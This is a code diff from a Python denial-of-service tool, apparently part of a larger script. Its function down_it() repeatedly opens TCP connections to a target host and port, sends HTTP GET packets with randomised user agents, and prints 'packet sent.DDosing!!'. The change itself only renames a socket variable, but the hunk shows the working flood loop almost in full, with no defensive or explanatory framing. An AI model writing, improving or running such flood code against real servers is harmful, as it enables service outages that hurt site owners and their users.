@@ -39,13 +39,13 @@ def down_it():
     try:
         while True:
             packet = str("GET / HTTP/1.1\nHost: " + host + "\n\n User-Agent: " + random.choice(uagent) + "\n" + data).encode('utf-8')
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((host, int(port)))
-            if s.sendto(packet, (host, int(port))):
-                s.shutdown(1)
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((host, int(port)))
+            if sock.sendto(packet, (host, int(port))):
+                sock.shutdown(1)
                 print("\033[92m", time.ctime(time.time()), "\033[0m \033[94m <--packet sent.DDosing!! \033[0m")
             else:
-                s.shutdown(1)
+                sock.shutdown(1)
                 print("\033[91mShut<->down\033[0m")
             time.sleep(.1)
     except socket.error as _:
